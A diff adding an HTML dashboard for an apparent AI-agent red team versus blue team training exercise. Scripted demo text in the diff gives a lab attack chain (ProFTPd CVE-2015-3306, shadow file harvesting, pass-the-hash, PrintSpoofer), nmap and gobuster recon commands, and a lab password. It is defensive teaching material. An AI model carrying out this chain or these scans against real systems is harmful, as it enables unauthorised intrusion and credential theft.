@@ -1,0 +1,3070 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SWARM CAGE — LIVE</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#020208;--bp:#05050f;--bi:#08081a;
+  --red:#ff3355;--rd:#a01030;--rm:#e02040;
+  --blu:#1a7ad0;--bld:#0e4488;--blm:#2a9ae0;
+  --grn:#00f090;--amb:#ffbc00;--wht:#e8e8f8;
+  --gr:#7878a0;--bdr:#10101e;
+  --gr-r:0 0 16px rgba(255,51,85,.50);
+  --gr-b:0 0 16px rgba(26,122,208,.60);
+  --gr-g:0 0 12px rgba(0,240,144,.45);
+  --gr-a:0 0 12px rgba(255,188,0,.45);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--wht);font-family:'Share Tech Mono','Courier New',monospace;font-size:14px;display:flex;flex-direction:column}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.055) 3px,rgba(0,0,0,.055) 4px)}
+
+.banner{display:flex;background:var(--bg);border-bottom:1px solid var(--bdr);flex-shrink:0}
+.br{flex:1;padding:9px 16px;border-right:1px solid var(--bdr);background:rgba(255,51,85,.08)}
+.bb{flex:1;padding:9px 16px;background:rgba(26,122,208,.08)}
+.bt{font-family:'Orbitron',sans-serif;font-weight:900;font-size:16px;letter-spacing:2px}
+.bts{font-size:10px;letter-spacing:2px;margin-top:3px}
+.br .bt{color:var(--red);text-shadow:var(--gr-r)}
+.br .bts{color:#e06070}
+.bb .bt{color:#60d0ff;text-shadow:var(--gr-b)}
+.bb .bts{color:#4aacdc}
+.bm{text-align:center;padding:9px 14px;border-right:1px solid var(--bdr);background:var(--bp);min-width:190px;flex-shrink:0}
+.bmt{font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:2px;color:var(--amb);text-shadow:var(--gr-a)}
+
+/* Phase indicators */
+.phases{display:flex;border-bottom:1px solid var(--bdr);background:var(--bp);flex-shrink:0}
+.rphases{flex:1;display:flex;border-right:1px solid var(--bdr)}
+.bphases{flex:1;display:flex}
+.phase{flex:1;padding:6px 3px;text-align:center;font-size:12px;letter-spacing:1px;color:#484870;border-right:1px solid var(--bdr);transition:all .3s;cursor:default}
+.phase:last-child{border-right:none}
+.phase .pn{display:block;font-size:10px;color:#2a2a50;margin-bottom:2px}
+.phase.active.red{color:var(--red);text-shadow:var(--gr-r);background:rgba(255,51,85,.05)}
+.phase.active.red .pn{color:var(--rm)}
+.phase.done.red{color:#c04050;background:rgba(255,51,85,.03)}
+.phase.done.red .pn{color:#883040}
+.phase.active.blue{color:#60d0ff;text-shadow:var(--gr-b);background:rgba(26,122,208,.06)}
+.phase.active.blue .pn{color:var(--blm)}
+.phase.done.blue{color:var(--blm);background:rgba(26,122,208,.03)}
+.phase.done.blue .pn{color:#1a6090}
+.psep{width:1px;background:var(--bdr);flex-shrink:0}
+
+/* Main grid */
+.grid{display:grid;grid-template-columns:1fr 1px 1fr;flex:1;min-height:0;overflow:hidden}
+.vdiv{background:linear-gradient(180deg,var(--red),var(--blu));opacity:.40}
+
+/* Terminals */
+.pane{display:flex;flex-direction:column;overflow:hidden;min-height:0}
+.ptb{display:flex;align-items:center;justify-content:space-between;padding:7px 14px;border-bottom:1px solid var(--bdr);flex-shrink:0}
+.ptbl{display:flex;align-items:center;gap:8px}
+.tds{display:flex;gap:4px}
+.td{width:8px;height:8px;border-radius:50%}
+.td-r{background:#ff5f57}.td-y{background:#febc2e}.td-g{background:#28c840}
+.ptitle{font-size:10.5px;letter-spacing:2px}
+.pr .ptitle{color:#e04060}
+.pb .ptitle{color:var(--blm)}
+.pstat{font-size:10px;color:var(--gr);letter-spacing:1px}
+.pstat.active-r{color:var(--red);animation:blink .8s infinite}
+.pstat.active-b{color:#60d0ff;animation:blink .8s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.terminal{flex:1;overflow-y:auto;padding:13px;line-height:1.9;min-height:0;font-size:14px}
+
+/* Terminal entries */
+.ts{color:#5050a0;font-size:11px}.ts::before{content:'// '}
+.te{margin:8px 0}
+.te-hdr{font-size:10.5px;letter-spacing:1.5px;margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.te-hdr::before{content:'▶';font-size:8.5px;opacity:.6}
+.red .te-hdr{color:var(--red)}
+.blue .te-hdr{color:#60d0ff}
+.te-body{white-space:pre-wrap;padding:6px 0 6px 12px;font-size:14px;line-height:1.8}
+.red .te-body{border-left:2px solid var(--rd);color:#f0c8c8}
+.blue .te-body{border-left:2px solid var(--bld);color:#c0daf0}
+.te-alert{color:var(--grn);font-size:11px;padding:4px 10px;background:rgba(0,240,144,.06);border-left:2px solid var(--grn);margin:5px 0}
+.te-detect{color:var(--amb);font-size:11px;padding:4px 10px;background:rgba(255,188,0,.06);border-left:2px solid var(--amb);margin:5px 0}
+.te-crit{font-family:'Orbitron',sans-serif;font-size:12px;text-align:center;letter-spacing:2px;padding:10px 0}
+.red .te-crit{color:var(--red);text-shadow:var(--gr-r)}
+.blue .te-crit{color:var(--grn);text-shadow:var(--gr-g)}
+
+/* SIEM panel in blue pane */
+.siem{border-top:1px solid var(--bld);background:rgba(26,122,208,.05);flex-shrink:0;max-height:165px;overflow:hidden;display:flex;flex-direction:column}
+.siem-hdr{padding:5px 14px;font-size:10px;letter-spacing:2px;color:var(--blm);border-bottom:1px solid var(--bdr);flex-shrink:0}
+.siem-body{overflow-y:auto;padding:6px 14px;flex:1}
+.srow{display:flex;gap:10px;font-size:10.5px;line-height:1.7;border-bottom:1px solid var(--bdr);padding:3px 0}
+.st{color:#5050a0;flex-shrink:0;width:60px}
+.ss{flex-shrink:0;width:54px;font-family:'Orbitron',sans-serif;font-size:8.5px;letter-spacing:1px}
+.ss.high{color:var(--red)}.ss.med{color:var(--amb)}.ss.low{color:var(--grn)}.ss.info{color:var(--blm)}
+.ss.critical{color:#ff80ff;text-shadow:0 0 8px rgba(255,128,255,.5)}
+.sd{flex:1;color:var(--wht)}
+.sa{color:#5050a0;font-size:9.5px}
+
+/* Step gate */
+.step-gate{margin:14px 0;text-align:center;padding:8px 0;border-top:1px solid rgba(255,255,255,.07);border-bottom:1px solid rgba(255,255,255,.07)}
+.step-btn{background:transparent;font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;padding:10px 28px;cursor:pointer;border:1px solid var(--amb);color:var(--amb);transition:all .2s}
+.step-btn:hover{background:rgba(255,188,0,.07);box-shadow:var(--gr-a)}
+
+/* Bottom bar */
+.btm{display:flex;flex-direction:column;flex-wrap:nowrap;padding:0;gap:0;border-top:1px solid var(--bdr);flex-shrink:0}
+.btm-row{display:flex;align-items:center;gap:10px;padding:7px 16px;flex-wrap:nowrap}
+.btm-config{border-bottom:1px solid var(--bdr);background:var(--bp);overflow-x:auto}
+.btm-actions{background:color-mix(in srgb,var(--bp) 80%,var(--bg) 20%)}
+.btm-actions .timer{margin-left:auto}
+/* Tier notice spans (FREE TIER / LOCAL labels next to provider buttons) — class-based size so pmode can override */
+.tier-note{font-size:10px}
+body.pmode .tier-note{font-size:12px}
+/* Error recovery banner */
+#error-recovery-banner{background:rgba(255,51,85,.08);border:1px solid var(--red);padding:10px 16px;margin:8px;align-items:center;gap:12px;flex-wrap:wrap;flex-shrink:0}
+#error-recovery-banner .err-msg{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--red);flex:1}
+#error-recovery-banner button{background:transparent;font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;padding:5px 10px;cursor:pointer}
+.phase-recovery{background:rgba(255,180,0,.08);border:1px solid #d4a72c;padding:10px 14px;margin:6px 0;border-radius:2px}
+.phase-recovery-hdr{font-family:'Orbitron',sans-serif;font-size:11px;color:#d4a72c;letter-spacing:2px;margin-bottom:4px}
+
+.phase-recovery-cls{font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:2px;margin-bottom:3px;word-break:break-word}
+.phase-recovery-sub{font-family:'Share Tech Mono',monospace;font-size:10px;color:#d4a72c;opacity:.9;margin-bottom:4px;word-break:break-word}
+.phase-recovery-msg{font-family:'Share Tech Mono',monospace;font-size:10px;color:#d4a72c;opacity:.85;margin-bottom:8px;word-break:break-word}
+.phase-recovery-btns{display:flex;gap:6px;flex-wrap:wrap}
+.phase-recovery-btns button{background:transparent;border:1px solid #d4a72c;color:#d4a72c;font-family:'Share Tech Mono',monospace;font-size:9.5px;letter-spacing:1px;padding:4px 8px;cursor:pointer}
+.phase-recovery-btns button:hover{background:rgba(255,180,0,.18)}
+.phase-recovery-btns .prv-cont{border-color:#3aa66f;color:#3aa66f}
+.phase-recovery-btns .prv-cont:hover{background:rgba(58,166,111,.15)}
+.phase-recovery-btns .prv-skip{border-color:#5050a0;color:#7878a0}
+.phase-recovery-btns .prv-dismiss{border-color:var(--red);color:var(--red)}
+.phase-recovery-btns .prv-dismiss:hover{background:rgba(255,51,85,.15)}
+.startbtn{background:transparent;font-family:'Orbitron',sans-serif;font-weight:700;font-size:12px;letter-spacing:2px;padding:9px 18px;cursor:pointer;transition:all .3s;border:2px solid}
+.red-btn{border-color:var(--red);color:var(--red)}.red-btn:hover:not(:disabled){background:rgba(255,51,85,.08)}
+.go-btn{border-color:var(--amb);color:var(--amb);box-shadow:var(--gr-a)}.go-btn:hover:not(:disabled){background:rgba(255,188,0,.08)}
+.startbtn:disabled{border-color:var(--gr);color:var(--gr);cursor:not-allowed;box-shadow:none}
+.bsep{width:1px;height:30px;background:var(--bdr)}
+.binfo{font-size:10.5px;color:#5858a0}
+.apifield{background:var(--bi);border:1px solid var(--bdr);color:var(--amb);font-family:'Share Tech Mono',monospace;font-size:11px;padding:5px 9px;outline:none;width:230px}
+.apifield:focus{border-color:var(--gr)}
+.kconf-btm{font-size:10px;letter-spacing:1px;color:var(--gr);border:1px solid var(--gr);padding:5px 12px;display:inline-flex;align-items:center;gap:8px;white-space:nowrap}
+.kc-clear{cursor:pointer;opacity:.5;font-size:12px;line-height:1}.kc-clear:hover{opacity:1}
+.timer{font-family:'Orbitron',sans-serif;font-size:13px;color:var(--grn);text-shadow:var(--gr-g);margin-left:auto}
+.live-toggle{background:transparent;font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1px;padding:7px 13px;cursor:pointer;transition:all .3s;border:1px solid var(--gr);color:var(--gr)}
+.live-toggle.active{border-color:var(--grn);color:var(--grn);box-shadow:var(--gr-g)}
+.live-toggle#combat-demo-btn.active{border-color:#4fc3f7;color:#4fc3f7;background:rgba(79,195,247,.06);box-shadow:none;text-shadow:0 0 8px rgba(79,195,247,.4)}
+.live-toggle:hover:not(.active){border-color:#6060a0;color:#8080c0}
+.bridge-dot{width:7px;height:7px;border-radius:50%;background:var(--gr);display:inline-block;margin-right:5px;transition:background .5s}
+.bridge-dot.ok{background:var(--grn);box-shadow:var(--gr-g)}
+.bridge-dot.err{background:var(--red)}
+.prv-mini{background:transparent;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:1px;padding:5px 9px;cursor:pointer;border:1px solid var(--gr);color:var(--gr);transition:all .2s;white-space:nowrap}
+.prv-mini.sel{border-color:var(--amb);color:var(--amb);background:rgba(255,188,0,.06)}
+.prv-mini:hover:not(.sel){border-color:#6060a0;color:#8080c0}
+.mdl-inp{background:var(--bi);border:1px solid var(--bdr);color:var(--amb);font-family:'Share Tech Mono',monospace;font-size:10px;padding:4px 7px;outline:none;width:200px;display:none}
+.mdl-inp:focus{border-color:var(--gr)}
+::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--gr)}
+@keyframes pulse-border{0%,100%{border-left:1px solid var(--grn)}50%{border-left:3px solid var(--grn)}}
+/* PRESENTATION MODE — optimized for projector. Toggle: Ctrl+P or body.classList.toggle('pmode') */
+body.pmode::after{display:none}
+body.pmode{font-size:15px}
+body.pmode .ph,body.pmode .eph,body.pmode .phase{font-size:13px;letter-spacing:.5px;padding:7px 4px}
+body.pmode .ph .pn,body.pmode .eph .epn,body.pmode .phase .pn{font-size:11px}
+body.pmode .sh{font-size:12px}
+body.pmode label{font-size:11px}
+body.pmode .ht{font-size:22px}
+body.pmode .hs{font-size:13px}
+body.pmode .bt{font-size:19px}
+body.pmode .bts{font-size:13px}
+body.pmode .term,body.pmode .terminal{font-size:15px;line-height:2.0}
+body.pmode .tc{font-size:14.5px}
+body.pmode .ts,body.pmode .ts-line{font-size:13px}
+body.pmode .tah{font-size:13px}
+body.pmode .te-hdr{font-size:13px}
+body.pmode .te-body{font-size:14px;line-height:2.0}
+body.pmode .ibtn,body.pmode .startbtn,body.pmode .begin-btn{font-size:15px;padding:13px 20px;letter-spacing:3px}
+body.pmode .demo-btn,body.pmode .live-toggle,body.pmode .mode-toggle{font-size:12px;padding:9px 15px}
+body.pmode .prvbtn,body.pmode .prv-mini{font-size:12px;padding:7px 11px}
+body.pmode .srow{font-size:13px}
+body.pmode .st,body.pmode .ss{font-size:12px}
+body.pmode .binfo{font-size:13px}
+body.pmode .ttl{font-size:13px}
+body.pmode .ptitle,body.pmode .pstat{font-size:13px}
+body.pmode .siem-hdr{font-size:13px;padding:7px 14px}
+body.pmode .ar{font-size:13px}
+body.pmode .ati{font-size:11px}
+body.pmode input[type=password],body.pmode textarea,body.pmode .apifield{font-size:13px}
+/* Contrast uplift — forge */
+body.pmode .ph{color:#7878b8}
+body.pmode .ph.active{color:var(--g)}
+body.pmode .ph.done{color:var(--a)}
+body.pmode .ph .pn{color:#9090c0}
+body.pmode .hr{color:#9898c8}
+body.pmode .ts{color:#9090d8}
+body.pmode .ati{color:#9090c0}
+body.pmode .rf{color:#8888b0}
+body.pmode .prvbtn{color:#8888b8;border-color:#8888b8}
+body.pmode .demo-btn{color:#9090c8;border-color:#7070a0;opacity:0.85}
+/* Contrast uplift — combat */
+body.pmode .phase{color:#7878b8}
+body.pmode .phase .pn{color:#7878b8}
+body.pmode .binfo{color:#8888c8}
+body.pmode .st{color:#8080d0}
+body.pmode .sa{font-size:12px;color:#8888c8}
+body.pmode .live-toggle{color:#8080aa;border-color:#8080aa}
+body.pmode .prv-mini{color:#8888b8;border-color:#8888b8}
+/* Contrast uplift — evolve */
+body.pmode .eph{color:#7878b8}
+body.pmode .eph .epn{color:#9090c0}
+body.pmode .mode-desc{color:#8888c8}
+body.pmode .agent-role{color:#9090c0}
+/* Touch targets */
+body.pmode .prvbtn,body.pmode .prv-mini,body.pmode .live-toggle,body.pmode .demo-btn{min-height:36px}
+body.pmode .ibtn,body.pmode .startbtn,body.pmode .begin-btn{min-height:48px}
+/* RESPONSIVE. Tablet-first; phone is best-effort with DEMO MODE prioritized. */
+@media (max-width:1024px){
+  .grid{grid-template-columns:1fr;grid-template-rows:1fr 1fr;overflow:auto}
+  .vdiv{display:none}
+  .btm-config{flex-wrap:wrap}
+}
+@media (max-width:768px){
+  body.pmode{font-size:13px}
+  .phase{font-size:10.5px;padding:5px 2px}
+  body.pmode .phase{font-size:11px;padding:5px 3px}
+  .phase .pn{font-size:8.5px}
+  body.pmode .phase .pn{font-size:9px}
+  body.pmode .te-body,.te-body{font-size:12px;line-height:1.7}
+  body.pmode .terminal,.terminal{font-size:12px;line-height:1.7}
+  .btm-row{flex-wrap:wrap;padding:6px 10px;gap:6px}
+  .btm-config{padding:5px 10px}
+  .ht{font-size:16px;letter-spacing:1px}
+  .hs{font-size:9px}
+  .hr{flex-wrap:wrap;gap:6px;font-size:9px}
+}
+@media (max-width:375px){
+  .ht{font-size:13px;letter-spacing:.5px}
+  .hs{display:none}
+  body{font-size:12px}
+  body.pmode{font-size:12px}
+  .phase{font-size:8.5px;padding:3px 1px}
+  body.pmode .phase{font-size:9px}
+  .phase .pn{font-size:7px}
+  .demo-btn,.live-toggle{font-size:10px;padding:7px 8px}
+}
+@media (pointer:coarse){
+  .prvbtn,.prv-mini,.live-toggle,.demo-btn,.swb{min-height:44px;min-width:44px}
+  .ibtn,.startbtn,.begin-btn{min-height:56px}
+  .ibtn{font-size:16px}
+}
+</style>
+</head>
+<body class="pmode">
+
+<div class="banner">
+  <div class="br">
+    <div class="bt">☠ RED TEAM OPS CENTER</div>
+    <div class="bts">OFFENSIVE OPERATIONS // ACTIVE ENGAGEMENT</div>
+  </div>
+  <div class="bm">
+    <div class="bmt">◆ SWARM CAGE LIVE</div>
+    <div style="font-size:9px;color:#5050a0;margin-top:3px;letter-spacing:1px" id="ts2">—</div>
+    <span id="tok-count" style="display:none;font-size:9px;color:#3aa66f;letter-spacing:1px;border:1px solid #3aa66f;padding:1px 5px;margin-top:4px;font-variant-numeric:tabular-nums">tokens: 0 ▌</span>
+  </div>
+  <div class="bb">
+    <div class="bt" style="text-align:right">BLUE TEAM SOC ⚡</div>
+    <div class="bts" style="text-align:right">DEFENSIVE OPS // ACTIVE MONITORING</div>
+  </div>
+</div>
+
+<div class="phases">
+  <div class="rphases" id="rphases">
+    <div class="phase" id="rp0" title="R0 STAGING — Red team prepares tooling and infrastructure"><span class="pn">R0</span>STAGING</div>
+    <div class="phase" id="rp1" title="R1 RECON — External reconnaissance and target enumeration"><span class="pn">R1</span>RECON</div>
+    <div class="phase" id="rp2" title="R2 INITIAL ACCESS — First foothold in the target environment"><span class="pn">R2</span>INITIAL ACCESS</div>
+    <div class="phase" id="rp3" title="R3 PERSIST — Establish persistence mechanisms"><span class="pn">R3</span>PERSIST</div>
+    <div class="phase" id="rp4" title="R4 LATERAL MOVE — Move across hosts and pivot through the network"><span class="pn">R4</span>LATERAL MOVE</div>
+    <div class="phase" id="rp5" title="R5 OBJECTIVES — Reach mission objectives (DC compromise, crown jewels)"><span class="pn">R5</span>OBJECTIVES</div>
+    <div class="phase" id="rp6" title="R6 EXFIL — Stage and extract data while avoiding detection"><span class="pn">R6</span>EXFIL</div>
+  </div>
+  <div class="psep"></div>
+  <div class="bphases" id="bphases">
+    <div class="phase" id="bp0" title="B0 DEPLOY — Blue team rolls out detection rules and SIEM coverage"><span class="pn">B0</span>DEPLOY</div>
+    <div class="phase" id="bp1" title="B1 MONITOR — Continuous SIEM and EDR telemetry monitoring"><span class="pn">B1</span>MONITOR</div>
+    <div class="phase" id="bp2" title="B2 DETECT — Trigger detections from red team activity"><span class="pn">B2</span>DETECT</div>
+    <div class="phase" id="bp3" title="B3 INVESTIGATE — Analyst triage, correlate alerts, scope the incident"><span class="pn">B3</span>INVESTIGATE</div>
+    <div class="phase" id="bp4" title="B4 CONTAIN — Isolate compromised hosts, kill sessions, block C2"><span class="pn">B4</span>CONTAIN</div>
+    <div class="phase" id="bp5" title="B5 HUNT — Proactive hunting for additional attacker footholds"><span class="pn">B5</span>HUNT</div>
+    <div class="phase" id="bp6" title="B6 HARDEN — Apply lessons learned, close gaps, update detections"><span class="pn">B6</span>HARDEN</div>
+  </div>
+</div>
+
+<div id="error-recovery-banner" style="display:none">
+  <span class="err-msg">⚠ API error encountered. How do you want to proceed?</span>
+  <button id="err-retry-btn" style="border:1px solid var(--red);color:var(--red)">[ RETRY ]</button>
+  <button id="err-demo-btn" style="border:1px solid var(--amb);color:var(--amb)">[ SWITCH TO DEMO MODE ]</button>
+  <button id="err-dismiss-btn" style="border:1px solid var(--gr);color:var(--gr)">[ DISMISS ]</button>
+</div>
+
+<div class="grid">
+  <!-- RED TEAM PANE -->
+  <div class="pane pr">
+    <div class="ptb">
+      <div class="ptbl">
+        <div class="tds"><div class="td td-r"></div><div class="td td-r" style="opacity:.4"></div><div class="td td-r" style="opacity:.2"></div></div>
+        <span class="ptitle">RED TEAM // OFFENSIVE OPS // LIVE FEED</span>
+      </div>
+      <span class="pstat" id="r-stat">STANDBY</span>
+    </div>
+    <div class="terminal red" id="r-term">
+      <div class="ts">Red team operators on standby. Awaiting ENGAGE command.</div>
+      <div class="ts">Swarm: red-team-ops-v2 | Agents: RECON // INITIAL-ACCESS // PRIVESC // LATERAL-MOVE // PAYLOAD</div>
+    </div>
+  </div>
+
+  <div class="vdiv"></div>
+
+  <!-- BLUE TEAM PANE -->
+  <div class="pane pb">
+    <div class="ptb">
+      <div class="ptbl">
+        <div class="tds"><div class="td td-g"></div><div class="td td-g" style="opacity:.4"></div><div class="td td-g" style="opacity:.2"></div></div>
+        <span class="ptitle">BLUE TEAM // SOC OPERATIONS // LIVE FEED</span>
+      </div>
+      <span class="pstat" id="b-stat">STANDBY</span>
+    </div>
+    <div class="terminal blue" id="b-term" style="flex:1;overflow-y:auto">
+      <div class="ts">Blue team SOC on standby. Deploy command will initialize monitoring.</div>
+      <div class="ts">Swarm: blue-team-ops-v1 | Agents: TELEMETRY-ANALYST // DETECTION-ENGINEER // INCIDENT-COMMANDER // FORENSIC-COLLECTOR // THREAT-HUNTER</div>
+    </div>
+    <div class="siem" id="siem">
+      <div class="siem-hdr">// SIEM ALERT QUEUE — LIVE</div>
+      <div class="siem-body" id="siem-body">
+        <div class="srow"><span class="st">—</span><span class="ss info">WAITING</span><span class="sd">SOC standing by. No alerts.</span><span class="sa">—</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="evolve-banner" style="display:none;background:rgba(0,240,144,.06);border-top:1px solid var(--grn);border-bottom:1px solid var(--bdr);padding:14px 16px;align-items:center;gap:12px;flex-shrink:0;animation:pulse-border 1.5s infinite">
+  <span style="color:var(--grn);font-family:'Orbitron',sans-serif;font-size:12px;letter-spacing:2px">⚡ EVOLVED AGENT</span>
+  <span id="evolve-banner-text" style="color:var(--wht);font-size:13px;flex:1"></span>
+  <button onclick="loadEvolvedAgent()" style="background:transparent;border:1px solid var(--grn);color:var(--grn);font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;padding:4px 12px;cursor:pointer">[ LOAD ]</button>
+  <button onclick="dismissEvolveBanner()" style="background:transparent;border:1px solid var(--gr);color:var(--gr);font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:1px;padding:4px 12px;cursor:pointer">[ IGNORE ]</button>
+</div>
+
+<div class="btm">
+  <div class="btm-row btm-config">
+    <button class="live-toggle" id="combat-demo-btn" onclick="toggleCombatDemo()" title="Pre-scripted demo mode — no API key required">[ ◉ DEMO ]</button>
+    <button class="live-toggle" id="step-mode-btn" onclick="toggleCombatStep()" title="Pause between stages — click to advance. Explains each stage to the audience.">[ ⏸ STEP ]</button>
+    <button class="live-toggle" id="live-toggle-btn" onclick="toggleLiveMode()" title="Toggle LIVE MODE — polls the local visualization bridge instead of calling API">[ <span class="bridge-dot" id="bridge-dot"></span>LIVE MODE ]</button>
+    <div class="bsep"></div>
+    <button class="prv-mini" id="cprv-ant" onclick="setCombatProvider('anthropic')" title="Direct vendor API key. Not one of the workshop paths — you do not need this.">ANT</button>
+    <button class="prv-mini sel" id="cprv-cc" onclick="setCombatProvider('cc')" title="Claude Code CLI — run relay.py first; uses your own subscription">CLAUDE CODE</button>
+    <button class="prv-mini" id="cprv-ollama" onclick="setCombatProvider('ollama')" title="Ollama — fully local, offline capable">OLLAMA</button>
+    <span id="collama-note" class="tier-note" style="display:none;color:#4fc3f7;letter-spacing:1px;font-family:'Share Tech Mono',monospace">⚡ LOCAL</span>
+    <input class="mdl-inp" type="text" id="c-ollama-model" placeholder="llama3.2" style="display:none"/>
+    <div class="bsep"></div>
+    <input type="password" class="apifield" id="cak" placeholder="Anthropic API Key (sk-ant-...)"/>
+    <div id="cak-conf" style="display:none"><div class="kconf-btm">KEY CONFIGURED <span class="kc-clear" onclick="clearCombatKey()" title="Clear saved key">×</span></div></div>
+    <div class="bsep"></div>
+    <span style="color:var(--gr);font-size:9px;letter-spacing:1px;font-family:'Share Tech Mono',monospace">SCENARIO</span>
+    <button class="prv-mini sel" id="scen-iron" onclick="setScenario('ironclad')">IRONCLAD</button>
+    <button class="prv-mini" id="scen-phantom" onclick="setScenario('phantom')">PHANTOM FEED</button>
+    <button onclick="checkEvolveExport()" style="background:transparent;border:1px solid var(--gr);color:var(--gr);font-family:'Share Tech Mono',monospace;font-size:10px;padding:5px 10px;cursor:pointer" title="Manually check for evolve export">[ CHECK IMPORT ]</button>
+  </div>
+  <div class="btm-row btm-actions">
+    <button class="startbtn red-btn" id="setup-btn" onclick="setupInfra()">[ SETUP NETWORK ]</button>
+    <button class="startbtn go-btn" id="engage-btn" onclick="engage()" disabled style="padding:10px 24px;font-size:13px">[ ⚛ ENGAGE ]</button>
+    <button class="startbtn" id="dl-transcript-btn" onclick="dlCombatTranscript()" style="border-color:var(--amb);color:var(--amb);display:none">[ ⬇ TRANSCRIPT ]</button>
+    <button class="startbtn" id="reset-btn" onclick="resetCombat()" style="border-color:var(--gr);color:var(--gr)">[ RESET ]</button>
+    <div class="binfo" id="binfo">Setup vulnerable network, then engage to begin the exercise.</div>
+    <div id="evolve-badge" style="display:none;font-size:9px;font-family:'Orbitron',sans-serif;color:var(--grn);border:1px solid var(--grn);padding:4px 10px;letter-spacing:1px;text-shadow:var(--gr-g);white-space:nowrap"></div>
+    <div class="timer" id="timer">00:00</div>
+  </div>
+</div>
+
+<!-- ═══ CAGE DEMO MODE — pre-scripted exercise playback ═══ -->
+<script type="text/plain" id="cx-infra">
+## EXERCISE NETWORK: OPERATION IRONCLAD
+*Built by: range-ops-v1 ENVIRONMENT-BUILDER | Exercise: red-team-ops-v2 vs. blue-team-ops-v1*
+
+### Asset Inventory
+| Hostname | IP | OS | Key Services | Risk |
+|---|---|---|---|---|
+| METASPLOITABLE3-UBUNTU | 192.168.100.10 | Ubuntu 14.04 LTS | SSH/22 (OpenSSH 6.6), HTTP/80 (Apache 2.4.7), FTP/21 (ProFTPd 1.3.5), MySQL/3306 (root, no auth), Tomcat/8080, PHP /mutillidae | HIGH |
+| DVWA-UBUNTU | 192.168.100.11 | Ubuntu 20.04 | HTTP/80 (Apache/PHP/MySQL), MySQL/3306 | HIGH |
+| WINSERVER2019 | 192.168.100.12 | Windows Server 2019 Eval | SMB/445 (SMBv1 ENABLED), RDP/3389 (NLA disabled), IIS/80, WinRM/5985 | CRITICAL |
+
+### Intended Kill Chain (SEALED)
+Kali (192.168.100.1) → ProFTPd CVE-2015-3306 mod_copy RCE on 192.168.100.10 → root foothold → /etc/shadow harvest → Pass-the-Hash to 192.168.100.12 as exercise_user/Password123 → PrintSpoofer SYSTEM → flag at C:\flag.txt
+
+### Blue Team SIEM Setup
+Sysmon on WinServer2019 (SwiftOnSecurity config). Windows Security events forwarded: 4624, 4625, 4648, 4769, 4698, 7045. PowerShell Script Block Logging enabled (Event 4104). Zeek on 192.168.100.1 monitoring vboxnet0 (host-only interface).
+
+### Exercise Parameters
+Duration: 60 min | Red start position: no access from 192.168.100.1 | Primary objective: flag at C:\flag.txt | Out of scope: DoS, physical access
+</script>
+<script type="text/plain" id="cx-recon">
+[09:00:01] PHASE: RECON
+TECHNIQUE: T1046 Network Service Scanning
+TOOL: nmap -sn 192.168.100.0/24 -oA recon/discovery
+FINDING: Live hosts — 192.168.100.10 (Ubuntu 14.04), 192.168.100.11 (Ubuntu 20.04), 192.168.100.12 (Windows Server 2019)
+CONFIDENCE: HIGH
+NEXT: Full TCP scan + service fingerprinting on all three hosts
+
+[09:01:14] PHASE: RECON
+TECHNIQUE: T1046 Network Service Scanning
+TOOL: nmap -sS -T4 --open -sV -sC -p- 192.168.100.10 -oA recon/meta3-full
+FINDING: 21/tcp ProFTPd 1.3.5 | 22/tcp OpenSSH 6.6 | 80/tcp Apache 2.4.7 | 3306/tcp MySQL 5.5 root/no-auth | 8080/tcp Tomcat 7.0.68
+CONFIDENCE: HIGH
+NEXT: ProFTPd 1.3.5 matches CVE-2015-3306 mod_copy RCE — high confidence exploit path
+
+[09:02:47] PHASE: RECON
+TECHNIQUE: T1595 Active Scanning — web app fingerprinting
+TOOL: gobuster dir -u http://192.168.100.10/mutillidae -w /usr/share/wordlists/dirb/common.txt -x php,html
+FINDING: /mutillidae/index.php, /mutillidae/config.php — PHP web application accessible, default install
+CONFIDENCE: HIGH
+
+[09:03:22] PHASE: RECON
+TECHNIQUE: T1210 Exploitation of Remote Services — SMB enum
+TOOL: nmap -p 445,3389,5985 192.168.100.12 --script smb-security-mode,smb-vuln-ms17-010
+FINDING: SMB/445 OPEN — SMBv1 ENABLED (smb-security-mode: authentication level=user). RDP/3389 OPEN — NLA disabled (banner confirms). WinRM/5985 OPEN. MS17-010: NOT VULNERABLE.
+CONFIDENCE: HIGH
+
+RECON-FINDINGS SUMMARY:
+TARGET: 192.168.100.10 | OPEN: 21/ProFTPd-1.3.5, 22/SSH, 80/Apache, 3306/MySQL-noauth
+RECOMMENDED ATTACK PATHS: ProFTPd 1.3.5 CVE-2015-3306 mod_copy RCE — HIGH | MySQL root no-auth — MED
+TARGET: 192.168.100.12 | OPEN: 445/SMBv1, 3389/RDP-NLA-off, 5985/WinRM | CREDS: exercise_user/Password123 (from brief)
+
+RECON COMPLETE — RECOMMENDED INITIAL ACCESS VECTOR: ProFTPd 1.3.5 CVE-2015-3306 on 192.168.100.10
+</script>
+<script type="text/plain" id="cx-monitor">
+TELEMETRY-ANALYST — Log Ingestion and First-Pass Anomaly Detection
+Analyzing SIEM telemetry. Zeek conn.log + Sysmon ingest active...
+
+detection-feed.md entries written:
+
